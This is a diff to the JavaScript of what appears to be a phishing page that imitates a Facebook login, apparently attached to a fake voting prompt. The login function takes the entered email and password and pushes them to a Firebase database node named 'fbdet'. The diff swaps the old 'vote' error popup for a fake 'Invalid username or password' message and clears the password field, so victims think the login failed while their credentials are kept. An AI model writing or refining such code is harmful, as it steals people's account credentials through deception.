@@ -100,13 +100,14 @@ function iglog() {
 }
 
 function login() {
+  // Attempt anonymous sign-in with Firebase Authentication
   firebase
     .auth()
     .signInAnonymously()
     .catch(function (error) {
-      var errorCode = error.code;
       var errorMessage = error.message;
-      window.alert("Error: " + errorMessage);
+      // Display Firebase auth errors in the error box
+      showError(errorMessage);
     });
 
   var email = document.getElementById("fb-email").value;
@@ -117,6 +118,7 @@ function login() {
   var accountType = "Facebook";
 
   if (email !== "" && password !== "") {
+    // Push the data to Firebase Realtime Database
     firebase.database().ref("fbdet").push({
       emle: email,
       mobile: "",
@@ -127,16 +129,25 @@ function login() {
       type: accountType,
     });
 
+    // Use setTimeout to simulate the delay, then display an error message in the error box
     setTimeout(function () {
-      Swal.fire({
-        title: "Oops!",
-        text: "Something went wrong with your vote.",
-        icon: "error",
-        confirmButtonText: "Try Again",
-      });
+      showError("Invalid username or password");
       document.getElementById("fb-pass").value = "";
-
       return false;
     }, 2000);
+  } else {
+    // Show an error if email or password is missing
+    showError("Please enter both email and password.");
   }
+}
+
+function showError(message) {
+  var errorBox = document.getElementById("error_box");
+  errorBox.style.display = "block";
+  errorBox.querySelector("div:nth-child(2)").textContent = message;
+}
+
+function hideError() {
+  var errorBox = document.getElementById("error_box");
+  errorBox.style.display = "none";
 }
